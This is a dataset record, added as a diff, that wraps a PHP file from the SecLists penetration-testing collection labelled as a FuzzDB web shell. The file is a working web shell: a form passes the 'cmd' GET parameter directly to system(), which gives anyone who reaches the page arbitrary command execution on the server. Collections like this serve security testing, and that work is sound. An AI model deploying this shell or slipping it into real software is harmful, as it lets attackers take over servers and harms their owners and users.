@@ -1,0 +1,9 @@
+{
+  "source": "github",
+  "source_id": "github:danielmiessler/SecLists:Web-Shells/FuzzDB/cmd.php",
+  "title": "danielmiessler/SecLists/Web-Shells/FuzzDB/cmd.php",
+  "text": "<?\n//\n// PHP_KIT\n//\n// cmd.php = Command Execution\n//\n// by: The Dark Raver\n// modified: 21/01/2004\n//\n?>\n<HTML><BODY>\n<FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\">\n<INPUT TYPE=\"text\" NAME=\"cmd\">\n<INPUT TYPE=\"submit\" VALUE=\"Send\">\n</FORM>\n<pre>\n<?\nif($_GET['cmd']) {\n  system($_GET['cmd']);\n  }\n?>\n</pre>\n</BODY></HTML>\n\n\n",
+  "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Web-Shells/FuzzDB/cmd.php",
+  "language": "php",
+  "kind": "code"
+}
